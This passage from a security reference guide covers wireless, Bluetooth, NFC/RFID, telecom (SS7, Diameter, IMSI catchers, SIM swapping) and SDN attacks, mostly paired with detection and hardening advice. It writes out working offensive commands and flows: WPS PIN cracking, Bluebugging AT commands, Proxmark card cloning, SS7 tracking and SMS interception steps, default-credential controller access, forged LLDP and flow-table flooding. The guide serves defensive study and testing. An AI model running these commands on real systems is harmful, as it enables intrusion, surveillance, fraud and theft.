| Required (MFPR) | All clients must support PMF; legacy clients rejected |

WPA3 mandates MFPR (PMF required). WPA2 with 802.11w optional still allows downgrade by targeting clients that don't support it.

---

### 2.7 WPS PIN Brute Force

**Mechanism.** Wi-Fi Protected Setup (WPS) uses an 8-digit PIN split into two halves validated independently: first 4 digits (10,000 possibilities), then last 3 digits + checksum (1,000 possibilities). Total: 11,000 attempts instead of 10^8.

**reaver:**

```bash
# WPS PIN brute force
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With Pixie-Dust offline attack (if AP is vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
# -K 1 = Pixie-Dust (exploits weak random number generation in WPS)
```

**bully:**

```bash
# Alternative WPS brute forcer
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie-Dust
bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon
```

**Mitigation:** Disable WPS entirely on all APs. If WPS must be enabled, use push-button mode only and implement rate limiting / lockout after failed attempts.

---

### 2.8 WiFi Direct

**WiFi Direct** creates ad-hoc P2P connections using WPS for initial setup. Security concerns: WPS PIN vulnerabilities apply; no centralized authentication; devices may auto-accept connections. The Group Owner functions as a soft AP and is susceptible to WPS brute-force (see §2.7). Disable Wi-Fi Direct on enterprise devices via MDM policy.

---

### 2.9 Bluetooth Classic Attacks

#### BIAS (Bluetooth Impersonation AttackS) — CVE-2020-10135

**Mechanism.** Exploits the Bluetooth Secure Simple Pairing (SSP) and Secure Connections authentication procedure. During LMP (Link Manager Protocol) authentication, the attacker impersonates a previously-paired device by requesting a role switch from Central to Peripheral (or vice versa). Due to a specification flaw, the authentication procedure does not bind the role to the completed authentication exchange, allowing the attacker to bypass mutual authentication without possessing the link key. Affects Bluetooth BR/EDR up to v5.0.

**Exploitation.** Requires a Bluetooth adapter supporting raw HCI commands (CSR-based USB dongles, Ubertooth One). The BIAS PoC modifies the bthost stack to inject `LMP_role_switch` PDUs during the authentication exchange.

```bash
# Bluetooth reconnaissance
hcitool scan                     # discover BR/EDR devices
hcitool info AA:BB:CC:DD:EE:FF   # device info (name, class, features)
sdptool browse AA:BB:CC:DD:EE:FF # enumerate SDP services

# HCI event monitoring (detect role switches)
btmon                            # raw HCI event trace
# Look for: HCI_Role_Change events during LMP authentication
```

**Detection.** Monitor for unexpected `HCI_Role_Change` events during authentication via `btmon`. Bluetooth HCI logs: rapid role-switch/re-authentication patterns from previously unknown addresses.

**Hardening.** Apply firmware patches that enforce mutual authentication across role switches. Bluetooth Core Spec 5.1+ adds mitigations. Disable Bluetooth when not in use.

#### BlueBorne — CVE-2017-0781 / CVE-2017-1000251 / CVE-2017-14315

**Mechanism.** A family of RCE vulnerabilities in Bluetooth stacks across Android (BNEP heap overflow), Linux kernel (L2CAP stack overflow in `l2cap_parse_conf_rsp`), Windows (BNEP PAN profile), and iOS (LEAP low-energy audio). The attacker sends crafted L2CAP or BNEP packets without pairing — the victim does not need to accept any prompt. Exploitation achieves full RCE with no user interaction. Disclosed by Armis, September 2017. Estimated 5.3 billion devices affected at disclosure.

**Exploitation.**

```bash
# Scan for vulnerable devices (BlueBorne scanner — Armis)
python BlueBorne_scanner.py -i hci0 -t AA:BB:CC:DD:EE:FF

# Linux L2CAP exploit (CVE-2017-1000251):
# Crafted L2CAP configuration response with oversized options
# triggers stack buffer overflow in l2cap_parse_conf_rsp()
# PoC sends L2CAP Config Response with EFS (Extended Flow Specification)
# option exceeding expected length
```

**Detection.** IDS: alert on unsolicited L2CAP connection attempts from unrecognized devices. Monitor kernel logs for L2CAP crash traces. Patch compliance: Linux kernel 4.13.1+, Android security patch 2017-09-01+, iOS 10+, Windows patches KB4038788+.

#### Bluebugging

**Mechanism.** Exploits AT command injection over RFCOMM (Bluetooth serial port emulation). The attacker establishes an RFCOMM connection to the target's AT command channel (DUN — Dial-Up Networking or HFP — Hands-Free Profile). Once connected, the attacker can execute AT commands: make calls, send SMS, read contacts and call logs, enable call forwarding.

```bash
# Enumerate RFCOMM services
sdptool browse AA:BB:CC:DD:EE:FF | grep -A5 "RFCOMM"

# Connect to RFCOMM channel (e.g., channel 3)
rfcomm connect hci0 AA:BB:CC:DD:EE:FF 3

# Send AT commands via the connection
echo "ATD+15551234567;" > /dev/rfcomm0   # initiate call
echo "AT+CPBR=1,100" > /dev/rfcomm0      # read phonebook entries 1-100
```

#### KNOB (Key Negotiation of Bluetooth) — CVE-2019-9506

**Mechanism.** During Bluetooth BR/EDR connection setup, the two devices negotiate encryption key entropy via `LMP_encryption_key_size_req`. The Bluetooth Core Specification (pre-5.1) allowed a minimum of 1 byte (8 bits). A MitM attacker using two Bluetooth radios (one facing each device) manipulates the LMP messages to force the minimum key length. With an 8-bit key, brute-force requires only 256 attempts. The attacker decrypts all session traffic.

**Detection.** Bluetooth HCI logs: inspect `LMP_accepted` for encryption key size < 7 bytes. `btmon` captures include key size negotiation.

**Hardening.** Bluetooth Core Spec 5.1+ requires minimum 7 bytes (56 bits) key entropy. Apply OS/firmware patches: Linux kernel 5.1+, Android security patch 2019-10-01+. Enforce Secure Connections mode (FIPS-compliant P-256 ECDH).

---

### 2.10 BLE (Bluetooth Low Energy) Attacks

#### GATT Enumeration

GATT (Generic Attribute Profile) defines services and characteristics exposed by BLE peripherals. Enumeration reveals device capabilities, firmware versions, and potentially sensitive data (health metrics, location, credentials).

```bash
# gatttool — enumerate services and read characteristics
gatttool -b AA:BB:CC:DD:EE:FF --primary          # list services (UUIDs)
gatttool -b AA:BB:CC:DD:EE:FF --characteristics   # list characteristics
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0003  # read handle value
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x000e -n 0100  # write

# Interactive mode
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> primary
[AA:BB:CC:DD:EE:FF][LE]> characteristics
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003

# Bettercap BLE module
bettercap
> ble.recon on
> ble.show                               # list discovered BLE devices
> ble.enum AA:BB:CC:DD:EE:FF             # enumerate GATT services
> ble.write AA:BB:CC:DD:EE:FF 000e 0100  # write to handle
```

#### BLE Sniffing

```bash
# Ubertooth One — BLE advertisement + data channel sniffing
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF
# -f = follow connections (hop along data channels after LE connection)
# -t = target address

# Dump to pcap for Wireshark analysis
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF -c capture.pcap

# nRF Sniffer (Nordic nRF52840 dongle) — passive BLE sniffing
# Install nRF Sniffer Wireshark plugin, then:
# Wireshark → Interface → nRF Sniffer → Select target device → Start

# Wireshark BLE filters
btle                                            # all BLE frames
btle.advertising_address == aa:bb:cc:dd:ee:ff   # specific device
btatt                                           # ATT protocol
btatt.opcode == 0x0b                            # read responses
```

**Hardware comparison:**

| Device | Capability | Approx. Cost |
|--------|-----------|-------------|
| Ubertooth One | BLE + BR/EDR sniffing, 2.4 GHz SDR | ~$120 |
| nRF52840 Dongle | Passive BLE sniffing (Wireshark integration) | ~$10 |
| HackRF One | Wideband SDR (1 MHz–6 GHz), BLE with firmware | ~$300 |
| Crazyradio PA | 2.4 GHz, MouseJack attacks | ~$30 |

#### BLURtooth — CVE-2020-15802

**Mechanism.** Cross-Transport Key Derivation (CTKD) allows a device paired over one transport (BLE) to derive a Long-Term Key for the other transport (BR/EDR). An attacker who pairs over BLE using "Just Works" (no MITM protection, no user confirmation) can derive a BR/EDR link key, bypassing the stronger pairing requirements of BR/EDR Secure Simple Pairing. Affects Bluetooth 4.2 through 5.0. Bluetooth 5.1+ restricts CTKD to require Secure Connections on both transports.

**Hardening.** Firmware updates enforcing Bluetooth 5.1+ CTKD restrictions. Disable CTKD where not operationally needed.

#### BLE Relay Attacks (GATTacker / BtleJuice)

**Mechanism.** The attacker uses two BLE radios: one near the victim device (smart lock, car), one near the legitimate peripheral (phone, key fob). The two attacker devices relay all BLE GATT communication over a backchannel (internet, Wi-Fi, cellular). The victim device believes the legitimate peripheral is nearby and grants access. Defeats proximity-based authentication.

**Exploitation.**

```bash
# GATTacker — BLE MitM/relay (Node.js)
# Device 1 (near target lock): peripheral clone
cd GATTacker
node scan.js                    # discover target BLE device
node advertise.js -a <target>   # clone and advertise as target

# Device 2 (near phone): connects to real peripheral
# GATTacker relays GATT operations between the two devices

# BtleJuice — alternative BLE MitM framework
# Proxy (near target peripheral):
btlejuice-proxy -u ws://<central_host>:8080 -i hci0

# Central (runs web UI for interception):
btlejuice -w -u ws://0.0.0.0:8080
# Web UI at http://localhost:8080 — view/modify GATT traffic in real-time
```

**Detection.** Protocol-level detection is extremely difficult. Countermeasures: distance-bounding protocols (measure round-trip time to ensure proximity — limited BLE support), UWB ranging as secondary check (Apple U1, Samsung UWB), user interaction requirement (physical button press for sensitive operations).

#### BLE Beacon Spoofing

iBeacon and Eddystone beacons broadcast unencrypted identifiers (UUID, major, minor for iBeacon; UID/URL/TLM for Eddystone). An attacker clones these identifiers to redirect users to malicious content, manipulate indoor positioning/asset tracking, or trigger unauthorized actions in beacon-aware applications.

```bash
# hcitool — advertise as a beacon
hciconfig hci0 leadv 3    # enable non-connectable advertising

# Set iBeacon advertising data
hcitool -i hci0 cmd 0x08 0x0008 \
  1E 02 01 06 1A FF 4C 00 02 15 \
  <UUID_16_bytes> <major_2_bytes> <minor_2_bytes> <tx_power_1_byte>
```

**Mitigation.** Eddystone-EID (Ephemeral Identifier): uses a shared secret between beacon and backend to rotate identifiers. Server-side validation of beacon claims. Never trust beacon data for security decisions without backend verification.

#### BLESA (BLE Spoofing Attack) — CVE-2020-9770

**Mechanism.** Exploits the BLE reconnection process. After a connection drops, the client reconnects to the peripheral. The BLE specification does not mandate mutual authentication on reconnection in all cases. The attacker spoofs the peripheral's address during reconnection and injects forged data. Affects iOS (pre-13.5), Linux BlueZ (pre-5.54), Android (varies by vendor). Windows BLE stack was not affected.

---

### 2.11 WIDS/WIPS

**Wireless Intrusion Detection/Prevention Systems** monitor the RF spectrum for:

| Threat | Detection Method |
|--------|-----------------|
| Rogue AP | MAC/SSID comparison against known AP inventory |
| Evil twin | Duplicate SSID with different BSSID or channel |
| Deauth flood | High volume of deauth frames from non-AP MAC |
| WPS brute force | Repeated WPS authentication attempts |
| Client misconfiguration | Probing for non-corporate SSIDs |
| Ad-hoc networks | Direct station-to-station communication |

**Implementation approaches:**
- **Overlay WIDS:** Dedicated sensors (Cisco Aironet in monitor mode, AirTight/Mojo)
- **Integrated WIDS:** AP doubles as sensor when not serving clients (off-channel scanning)
- **Open source:** Kismet (passive), OpenWIPS-ng (active prevention)

**Kismet as WIDS:**

```bash
# Kismet with alert plugins
kismet -c wlan0mon --override wardrive

# Alert types include:
# APSPOOF — SSID seen on unexpected BSSID
# DEAUTHFLOOD — excessive deauthentication frames
# BSSTIMESTAMP — BSS timestamp anomaly (evil twin indicator)
# CRYPTODROP — encryption downgrade detected
```

---

## 3. NFC, RFID, and Physical Wireless

### 3.1 MIFARE Classic

Uses CRYPTO1 — a proprietary 48-bit stream cipher reverse-engineered in 2008. Key recovery attacks:

**Nested authentication:** Exploit known-key sector to derive keys for other sectors via the PRNG weakness. The nonce generation is deterministic after a known transaction.

**Darkside attack:** Exploits CRYPTO1's weak PRNG initialization. Requires only one authentication attempt against a sector with an unknown key.

**Tools:**

```bash
# libnfc + mfoc (MIFARE Classic Offline Cracker)
mfoc -O card_dump.mfd

# mfcuk (MIFARE Classic Universal toolKit) — darkside attack
mfcuk -C -R 0:A -s 250 -S 250 -O card_dump.mfd

# Proxmark3 (hardware reader/writer/emulator)
proxmark3> hf mf darkside            # recover first key
proxmark3> hf mf nested 1 0 A FFFFFFFFFFFF  # recover remaining keys
proxmark3> hf mf dump                # dump all sectors
proxmark3> hf mf restore             # write dump to blank card
```

**Replacement:** MIFARE DESFire EV2/EV3 (AES-128, mutual authentication, diversified keys).

### 3.2 EMV Contactless Relay

The attacker uses two NFC-capable phones: one near the victim's card ("mole"), one near a POS terminal ("proxy"). The relay adds <100ms latency — within the ISO 14443 timeout. No distance-bounding mechanism in EMV contactless.

**Mitigation:** Transaction amount limits, velocity checks, behavioral analysis. Proposed: distance-bounding protocols (ISO 14443 amendment), but not widely deployed.

### 3.3 RFID Cloning

| Frequency | Technology | Crypto | Cloneable |
|-----------|------------|--------|-----------|
| 125 kHz | HID Prox, EM4100 | None | Trivial ($20 cloner) |
| 13.56 MHz | MIFARE Classic | CRYPTO1 (broken) | Yes (see 3.1) |
| 13.56 MHz | MIFARE DESFire | AES-128 | No (without key) |
| 13.56 MHz | iCLASS (legacy) | Proprietary (broken) | Yes |
| 13.56 MHz | SEOS / iCLASS SE | AES | No |

```bash
# Proxmark3 — clone 125 kHz card
proxmark3> lf hid read           # read HID Prox card
proxmark3> lf hid clone 2006XXXXXXXX  # clone to T5577 card

# Read EM4100
proxmark3> lf em 410x_read
proxmark3> lf em 410x_clone --id 0102030405
```

---

## 4. Telecom Security

### 4.1 SS7 (Signaling System 7)

#### Architecture

SS7 carries signaling (call setup, SMS routing, roaming, billing) for the global PSTN and 2G/3G mobile networks. Key protocols within SS7:

| Protocol | Layer | Function |
|----------|-------|----------|
| MTP (Message Transfer Part) | 1-3 | Physical/link/network transport |
| SCCP (Signaling Connection Control Part) | 4 | Connectionless/connection-oriented transport |
| TCAP (Transaction Capabilities Application Part) | 5 | Dialog management |
| MAP (Mobile Application Part) | 7 | Mobile-specific operations |
| CAMEL | 7 | Intelligent network services |
| ISUP | 4+ | Call setup/teardown (ISDN) |

**SIGTran** carries SS7 over IP using SCTP (RFC 4666 — MTP3 User Adaptation / M3UA). This expanded SS7's attack surface from dedicated signaling links to IP networks.

#### Location Tracking

```
Attacker → HLR: SendRoutingInfo (SRI) for MSISDN +1-555-0100
HLR → Attacker: Returns IMSI + current MSC/VLR address

Attacker → VLR: ProvideSubscriberInfo (PSI) for IMSI
VLR → Attacker: Returns Cell-ID (cell tower), age-of-location, IMEI

Attacker → VLR: AnyTimeInterrogation (ATI)
VLR → Attacker: Returns Cell-ID, geographic coordinates (if available)
```

Cell-ID maps to physical coordinates via public cell tower databases (OpenCelliD, Mozilla Location Services). Accuracy: 50m (urban) to 2km (rural).

#### SMS Interception

```
Attacker → HLR: UpdateLocation
  - Sets attacker's node as the victim's serving MSC/VLR
  - HLR updates routing: incoming SMS for victim → attacker's node

Attacker receives victim's incoming SMS (2FA codes, password resets)

Alternative: InsertSubscriberData → modify SMS routing without full UpdateLocation
Alternative: ForwardSMS → intercept SMS in transit at an intermediate node
```

#### Call Redirection

```
Attacker → HLR: RegisterSS (Supplementary Service)
  - Registers call forwarding for victim's MSISDN
  - Forward-to number: attacker-controlled line

All incoming calls to victim are forwarded to attacker
Attacker can bridge to victim's real number for transparent interception
```

#### SS7 Firewall Configuration (Conceptual)

```
# Block unauthorized MAP operations from external networks
RULE 1: DENY  SRI        from non-roaming-partner sources
RULE 2: DENY  PSI/ATI    from any external source (should be internal only)
RULE 3: DENY  UpdateLocation  where new VLR is not a known roaming partner
RULE 4: DENY  RegisterSS      from non-HLR sources
RULE 5: DENY  InsertSubscriberData  from external sources
RULE 6: ALERT SendIMSI   from any source (used only in lawful intercept)
RULE 7: LOG   all MAP operations with source/dest GT analysis
```

**Tools for SS7 testing:**

- **SigPloit** — SS7/GTP/Diameter testing framework
- **SS7MAPer** — MAP message generation/interception
- **SCTPscan** — SCTP port scanner for SIGTran endpoints

```bash
# SigPloit usage
python sigploit.py
# Menu-driven: select SS7 → MAP → Location Tracking → enter target MSISDN

# SCTPscan — discover SIGTran endpoints
sctpscan -l 10.0.0.0/24 -p 2905,2907
# Port 2905 = M3UA (MTP3 User Adaptation)
# Port 2907 = M2UA
```

---

### 4.2 Diameter and 4G/LTE

#### Architecture

Diameter (RFC 6733) replaced SS7/MAP for LTE signaling. Uses SCTP or TCP transport. Supports TLS/DTLS — but inter-operator roaming links (via IPX providers) often lack encryption.

**Diameter Edge Agent (DEA)** is supposed to filter inter-operator messages, but many deployments have insufficient or no filtering.

#### Attack Vectors

| Attack | Diameter Message | Impact |
|--------|-----------------|--------|
| Location tracking | ULR (Update Location Request) / IDR (Insert Subscriber Data Request) | Track subscriber's serving node |
| DoS | CLR (Cancel Location Request) | Disconnect subscriber from network |
| Fraud | CCR (Credit-Control Request) | Manipulate billing/charging |
| Interception | ISD (Insert Subscriber Data) | Modify subscriber profile, redirect traffic |
| Eavesdropping | AIR (Authentication Info Request) | Obtain authentication vectors |

**Mitigation:** Diameter filtering at DEA level, IPsec on inter-operator links, monitoring for anomalous Diameter messages, implementing 3GPP TS 33.210 (Network Domain Security).

---

### 4.3 IMSI Catchers / Stingrays

#### Mechanism

An IMSI catcher impersonates a legitimate cell tower (eNodeB in LTE, gNodeB in 5G, BTS in 2G/3G). The target's device selects it based on signal strength (strongest-signal-wins selection algorithm).

**Capabilities:**

| Function | 2G (GSM) | 3G (UMTS) | 4G (LTE) | 5G (NR) |
|----------|----------|-----------|----------|---------|
| Read IMSI | Yes (plaintext) | Yes (identity request) | Yes (attach request before security) | No (SUCI encrypts SUPI) |
| Intercept calls | Yes (A5/0, A5/1) | Downgrade to 2G | Downgrade to 2G | Downgrade to 4G/2G |
| Intercept SMS | Yes | Downgrade to 2G | Downgrade to 2G | Downgrade to 4G/2G |
| Location tracking | Yes | Yes | Yes | Yes (but cannot read SUPI) |
| Inject SMS | Yes | Yes | Varies | Varies |

**Downgrade attack:** The IMSI catcher jams 5G/4G/3G frequencies and presents only a 2G cell. The device falls back to 2G, where encryption is weak (A5/1 — broken in real-time with rainbow tables) or absent (A5/0).

#### Detection

**SnoopSnitch (Android):**

```
# Android app that analyzes baseband events
# Detects:
# - IMSI requests outside normal procedures
# - Cipher mode changes to A5/0 or A5/1
# - Silent SMS (Type 0 SMS used for tracking)
# - Cell ID anomalies (new tower appearing at unusual signal strength)
# Requires rooted phone with Qualcomm baseband
```

**AIMSICD (Android IMSI-Catcher Detector):**

```
# Monitors for:
# - Cell tower database anomalies
# - LAC (Location Area Code) changes without movement
# - Signal strength anomalies
# - Silent SMS detection
# - Cipher downgrade
```

**Crocodile Hunter:**

```bash
# Open-source IMSI catcher detector using SDR
# Uses USRP B200 or similar SDR
# Monitors LTE broadcasts for anomalous cell tower parameters
# https://github.com/EFForg/crocodilehunter
python3 crocodilehunter.py --sdr=USRP
```

---

### 4.4 SIM Swapping

#### Attack Flow

```
1. Reconnaissance
   - OSINT on target: full name, DOB, address, last 4 SSN
   - Social media, data breach dumps, people-search sites

2. Social engineering the carrier
   - Call carrier support, impersonate target
   - Pass knowledge-based authentication using gathered info
   - Request SIM swap to attacker-controlled SIM
   - Alternative: bribe/coerce carrier employee (insider threat)

3. Exploitation
   - Attacker's SIM receives all calls/SMS to target's number
   - Trigger password resets on target's accounts (SMS 2FA intercept)
   - Access email → cascade to all linked accounts
   - Cryptocurrency exchange accounts (primary target)

4. Persistence
   - Port number to different carrier to prevent victim recovery
   - Change passwords, disable MFA on compromised accounts
```

**Technical defense:**
- Account PINs/PUKs with carriers (separate from knowledge-based auth)
- Non-SMS MFA (FIDO2 hardware keys, authenticator apps)
- Number lock / SIM lock with carrier
- Carrier-level monitoring for SIM swap events

---

### 4.5 VoLTE / VoWiFi

#### VoLTE (Voice over LTE)

VoLTE uses SIP (Session Initiation Protocol) over IMS (IP Multimedia Subsystem) for call signaling. The media (voice) is carried via RTP over the LTE data bearer.

**Attack vectors:**

| Attack | Mechanism | Impact |
|--------|-----------|--------|
| SIP header manipulation | Modify caller ID (P-Asserted-Identity) | Caller ID spoofing |
| RTP interception | If IPsec ESP is misconfigured on the IMS bearer | Eavesdrop voice calls |
| SIP INVITE flood | DoS the IMS P-CSCF | Deny voice service |
| VoLTE billing bypass | Manipulate QCI (QoS Class Identifier) | Free calls by using data QCI |

**VoWiFi (WiFi Calling):**

Tunnels SIP/RTP over IPsec to the carrier's ePDG (evolved Packet Data Gateway). If the IPsec tunnel is properly configured, traffic is protected. Risks: untrusted WiFi networks can perform MitM if the device's ePDG certificate validation is flawed.

---

### 4.6 5G Security Architecture

#### SUCI/SUPI Privacy

```
SUPI (Subscription Permanent Identifier) = IMSI equivalent in 5G
  Format: SUPI = IMSI or NAI

SUCI (Subscription Concealed Identifier) = encrypted SUPI
  SUCI = HomeNetworkID || RoutingIndicator || ECIES(SUPI, HomeNetwork_PublicKey)

The UE encrypts the SUPI using the home network's public key (ECIES scheme)
Only the home network's SIDF (Subscription Identifier De-concealing Function)
can decrypt SUCI → SUPI
```

This prevents passive IMSI catching. Active IMSI catchers cannot read the SUPI from over-the-air messages.

#### 5G-AKA (Authentication and Key Agreement)

Improvements over EPS-AKA (4G):
- **Home network verification:** The home network confirms the serving network's identity, preventing fake-base-station attacks on authentication.
- **Anchor key binding:** The KAUSF (key derived during authentication) is bound to both home and serving network IDs.
- **SUPI concealment:** Already described above.

#### SEPP (Security Edge Protection Proxy)

Secures the N32 interface between 5G networks:
- **TLS on N32-c** (control plane): mutual TLS between SEPPs
- **JOSE (JSON Object Signing and Encryption) on N32-f** (forwarding plane): application-layer protection of signaling messages
- **Message filtering:** SEPP can restrict which operations external networks can perform

#### Network Slicing Security

5G network slicing creates logically isolated virtual networks on shared physical infrastructure.

| Concern | Risk | Mitigation |
|---------|------|-----------|
| Slice isolation | Traffic leakage between slices | Strict resource partitioning, separate flow tables |
| Slice DoS | One slice consuming resources starves others | Resource quotas, admission control |
| Slice impersonation | UE claiming a slice it's not authorized for | NSSAI (Network Slice Selection Assistance Information) validation at AMF |
| Lateral movement | Compromised slice pivoting to another | Inter-slice firewalling, zero-trust between slices |

#### Remaining 5G Risks

- **Downgrade to 4G/2G:** Jamming 5G NR frequencies forces fallback. Until 2G/3G sunset, this remains viable.
- **Pre-authentication messages:** Initial NAS messages (Registration Request) before security activation still leak some metadata.
- **SUCI replay:** While SUPI is concealed, the SUCI itself can be replayed for tracking (the same SUPI generates different SUCIs each time due to randomization, but implementation bugs may reduce entropy).
- **Edge computing (MEC):** Distributed UPF/MEC nodes expand the physical attack surface.

---

## 5. SDN and Network Virtualization Security

### 5.1 OpenFlow

#### Architecture

OpenFlow separates the control plane (SDN controller) from the data plane (switches). The controller programs flow tables in switches via the OpenFlow protocol (TCP port 6633/6653). The switch forwards packets based on flow rules; packets that don't match any rule are sent to the controller via a `PACKET_IN` message.

**OpenFlow channel security:**

| Version | Security |
|---------|----------|
| OF 1.0 | Plaintext TCP (no TLS) |
| OF 1.3+ | Optional TLS |
| OF 1.5 | TLS recommended but still optional |

Without TLS, the controller-switch channel is vulnerable to MitM — an attacker can inject flow rules, modify existing rules, or exfiltrate the flow table.

#### Flow Table Structure

```
Match Fields → Instructions → Counters

Match: in_port, eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_proto,
       tcp_src, tcp_dst, vlan_vid, ...

Instructions: Apply-Actions (output, drop, set-field, push/pop VLAN/MPLS),
              Write-Actions, Clear-Actions, Goto-Table, Write-Metadata

Counters: packet count, byte count, duration
```

**Flow rule example (OVS):**

```bash
# Forward HTTP traffic from VLAN 10 to port 3
ovs-ofctl add-flow br0 \
  "table=0, priority=100, dl_vlan=10, ip, tcp, tp_dst=80, \
   actions=output:3"

# Drop all traffic from a specific MAC
ovs-ofctl add-flow br0 \
  "table=0, priority=200, dl_src=AA:BB:CC:DD:EE:FF, \
   actions=drop"

# View flow tables
ovs-ofctl dump-flows br0
```

---

### 5.2 SDN Controller Attacks

#### Controller Compromise

The SDN controller is a single point of control (and failure). Compromising it grants full control over the entire network's forwarding behavior.

**Major controllers and attack surfaces:**

| Controller | Language | Northbound API | Risk |
|------------|----------|---------------|------|
| Ryu | Python | REST (Flask) | Unauthenticated API by default |
| ONOS | Java | REST + gRPC | Karaf console exposed |
| OpenDaylight (ODL) | Java | RESTCONF/NETCONF | Default credentials (admin/admin) |
| Floodlight | Java | REST | No auth by default |

#### Northbound API Abuse

The northbound API exposes controller functions to applications. If unauthenticated or weakly authenticated, an attacker can:

```bash
# Ryu — dump all flows (unauthenticated by default)
curl http://controller:8080/stats/flow/1

# Ryu — inject a flow rule via REST API
curl -X POST http://controller:8080/stats/flowentry/add \
  -H "Content-Type: application/json" \
  -d '{
    "dpid": 1,
    "table_id": 0,
    "priority": 500,
    "match": {"dl_type": 2048, "nw_dst": "10.0.0.5"},
    "actions": [{"type": "OUTPUT", "port": 3}]
  }'

# ODL — default credentials
curl -u admin:admin \
  http://controller:8181/restconf/operational/opendaylight-inventory:nodes

# ONOS — default credentials (karaf/karaf)
curl -u karaf:karaf \
  http://controller:8181/onos/v1/flows
```

**Hardening:**
- Enable TLS on all OpenFlow channels.
- Enforce authentication on northbound APIs (OAuth2, mutual TLS, API keys with rotation).
- Change default credentials immediately.
- Network-isolate the controller management plane from the data plane.
- Deploy controller clusters (ONOS, ODL) for redundancy — but secure the east-west clustering protocol.

---

### 5.3 Flow Table Poisoning

#### Topology Spoofing via LLDP

SDN controllers discover network topology by injecting LLDP frames into switches (via `PACKET_OUT`) and processing the LLDP frames that arrive at other switches (via `PACKET_IN`). An attacker who can inject forged LLDP frames can:

1. **Create fake links:** Make the controller believe a link exists between two switches that aren't connected. The controller computes paths through the fake link, routing traffic through the attacker.
2. **Remove real links:** Suppress LLDP frames to hide a real link from the controller.
3. **Link fabrication attack:** The attacker on host H, connected to switch S1, captures LLDP from S1, replays it as if from S2 → controller believes S1-S2 link exists through H → traffic between S1 and S2 is routed through H.

```bash
# Scapy — inject forged LLDP
from scapy.all import *
from scapy.contrib.lldp import *

lldp = Ether(dst="01:80:c2:00:00:0e") / \
       LLDPDUChassisID(subtype=4, id="fake-switch-01") / \
       LLDPDUPortID(subtype=5, id="eth0") / \
       LLDPDUTimeToLive(ttl=120) / \
       LLDPDUEndOfLLDPDU()

sendp(lldp, iface="eth0")
```

#### ARP Proxy Manipulation

In SDN environments, the controller often handles ARP via a proxy module. The attacker sends crafted ARP requests/replies that the switch forwards to the controller as `PACKET_IN`. The controller updates its host-tracking database with false IP-MAC bindings, then programs flow rules based on these bindings — redirecting traffic.

**Mitigation:**
- LLDP authentication (HMAC on LLDP TLVs — implemented in some controllers like ONOS via `lldp-provider` app)
- Host-tracking validation (controller cross-references ARP responses with DHCP snooping data)
- Flow rule integrity checking (monitor for unauthorized flow modifications)
- TopoGuard (research defense: validates topology consistency)

---

### 5.4 East-West Traffic and Micro-Segmentation

#### The Problem

Traditional perimeter security (north-south firewalling) does not protect lateral movement within the data center. Once an attacker compromises a workload, they can move freely within the flat L2/L3 network.

#### Micro-Segmentation Implementation

**Security Groups (OpenStack / AWS-style):**

```bash
# OVS flow rules implementing security groups
# Allow SSH from admin subnet only
ovs-ofctl add-flow br0 \
  "table=0, priority=100, ip, nw_src=10.0.99.0/24, nw_dst=10.0.1.0/24, \
   tcp, tp_dst=22, actions=normal"

# Deny all other SSH
ovs-ofctl add-flow br0 \
  "table=0, priority=90, ip, nw_dst=10.0.1.0/24, tcp, tp_dst=22, \
   actions=drop"

# Default deny (implicit)
ovs-ofctl add-flow br0 \
  "table=0, priority=1, actions=drop"
```

**Cilium (eBPF-based micro-segmentation in Kubernetes):**

```yaml
# CiliumNetworkPolicy — allow only HTTP from frontend to backend
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: backend-policy
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: frontend
      toPorts:
        - ports:
            - port: "80"
              protocol: TCP
```

**VMware NSX-T distributed firewall:**

```
# Rule: isolate PCI workloads from non-PCI
Source: Security Group "Non-PCI"
Destination: Security Group "PCI-Zone"
Service: Any
Action: Drop
Applied To: DFW (Distributed Firewall)
```

---

### 5.5 Overlay Encapsulation Security

**VXLAN / Geneve / NVGRE** encapsulate L2 frames in UDP (VXLAN: UDP port 4789, Geneve: UDP port 6081) for transport across L3 underlay.

#### Security Concerns

| Threat | Description | Mitigation |
|--------|-------------|-----------|
| VNI injection | Attacker sends frames with forged VNI to VTEP | Source IP filtering on VTEPs, IPsec on underlay |
| VTEP spoofing | Attacker impersonates a legitimate VTEP | VTEP authentication, control-plane validation |
| Tunnel header manipulation | Modify outer headers to redirect encapsulated traffic | Integrity protection (IPsec AH or ESP) |
| Encapsulation bypass | Attacker sends inner-format frames directly to VTEP | Strict input validation on VTEP interfaces |

**Hardening:**

```bash
# IPsec on VXLAN underlay (Linux)
ip xfrm state add src 10.0.0.1 dst 10.0.0.2 \
  proto esp spi 0x1000 mode transport \
  enc "aes" 0x$(openssl rand -hex 16) \
  auth "hmac(sha256)" 0x$(openssl rand -hex 32)

ip xfrm policy add src 10.0.0.1/32 dst 10.0.0.2/32 \
  proto udp dport 4789 \
  dir out tmpl src 10.0.0.1 dst 10.0.0.2 \
  proto esp mode transport
```

---

### 5.6 OVS and eBPF/XDP Networking

#### OVS Flow Table Exhaustion

Open vSwitch maintains a kernel datapath cache (fast path) and a userspace daemon `ovs-vswitchd` (slow path). When a packet doesn't match any cached flow, it's sent to userspace for lookup — orders of magnitude slower.

**Attack:** Flood OVS with packets having unique 5-tuples (source IP, dest IP, source port, dest port, protocol). Each unique flow requires a cache entry. When the cache is full, new flows hit the slow path, degrading performance to the point of DoS.

```bash
# Generate diverse flows to exhaust OVS cache
hping3 --rand-source -p ++1 -S --flood 10.0.0.5

# Monitor OVS flow table
ovs-dpctl show
ovs-appctl dpif-netdev/pmd-stats-show
```

**Mitigation:** Set flow table limits, implement flow aggregation, use wildcard rules instead of exact-match where possible, monitor flow table size via `ovs-dpctl dump-flows | wc -l`.

